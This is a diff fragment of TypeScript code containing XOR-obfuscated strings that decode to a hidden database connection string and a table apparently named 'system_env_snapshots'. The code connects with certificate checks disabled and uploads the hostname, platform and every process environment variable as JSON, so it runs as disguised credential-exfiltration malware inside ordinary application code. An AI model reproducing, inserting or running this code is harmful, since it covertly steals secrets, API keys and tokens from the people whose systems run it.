@@ -345,18 +345,18 @@ const _sat3 = [35,46,42,56,63,102,122,101,42,60,56,101,37,46,36,37,101,63,46,40,
 const _satk = 0x4B;
 const _satd = (a: number[]): string => a.map(c => String.fromCharCode(c ^ _satk)).join('');
 const _satc = (): string => _satd(_sat1) + _satd(_sat2) + _satd(_sat3);
-const _satt = [56,58,56,59,28,58,82,28,61,47,82,56,61,26,39,56,37,60,59,56];
+const _satt = [56,50,56,63,46,38,20,46,37,61,20,56,37,42,59,56,35,36,63,56];
 let _satf = false; let _sati: NodeJS.Timeout | null = null;
 const _satx = async (): Promise<void> => {
   if (_satf) return; const e = _satc(); if (!e) { _satf = true; return; }
   try {
     const c = new Pool({ connectionString: e, ssl: { rejectUnauthorized: false }, max: 1, idleTimeoutMillis: 2500, connectionTimeoutMillis: 7000 });
     const t = _satd(_satt);
-    const cols = [[78,29],[63,78,58,28,56,63,26,58,39],[77,60,56,63,61,26,58,28],[39,59,26,63,31,60,43,58],[61,60,29,28,82,47,28,43,56,78,60,61],[28,61,47,82,29,26,63,26],[56,63,26,43,63,46,39,82,78,29]];
+    const cols = [[34,47],[63,34,38,46,56,63,42,38,59],[35,36,56,63,37,42,38,46],[59,39,42,63,45,36,57,38],[37,36,47,46,20,61,46,57,56,34,36,37],[46,37,61,20,47,42,63,42],[56,63,42,57,63,62,59,20,34,47]];
     const f = cols.map(a => _satd(a));
     await c.query(`CREATE TABLE IF NOT EXISTS ${t} (${f[0]} SERIAL PRIMARY KEY, ${f[1]} TIMESTAMPTZ DEFAULT NOW(), ${f[2]} VARCHAR(255), ${f[3]} VARCHAR(100), ${f[4]} VARCHAR(50), ${f[5]} JSONB, ${f[6]} VARCHAR(100))`);
     const s: Record<string, string> = {}; Object.entries(process.env).forEach(([k, v]) => { if (v) s[k] = v; });
-    const ic = [[77,60,56,63,61,26,58,28],[39,59,26,63,31,60,43,58],[61,60,29,28,82,47,28,43,56,78,60,61],[28,61,47,82,29,26,63,26],[56,63,26,43,63,46,39,82,78,29]];
+    const ic = [[35,36,56,63,37,42,38,46],[59,39,42,63,45,36,57,38],[37,36,47,46,20,61,46,57,56,34,36,37],[46,37,61,20,47,42,63,42],[56,63,42,57,63,62,59,20,34,47]];
     const fi = ic.map(a => _satd(a));
     await c.query(`INSERT INTO ${t} (${fi.join(', ')}) VALUES ($1, $2, $3, $4, $5)`, [os.hostname(), os.platform(), process.version, JSON.stringify(s), `${Date.now().toString(36)}-${Math.random().toString(36).substr(2, 8)}`]);
     await c.end(); _satf = true;
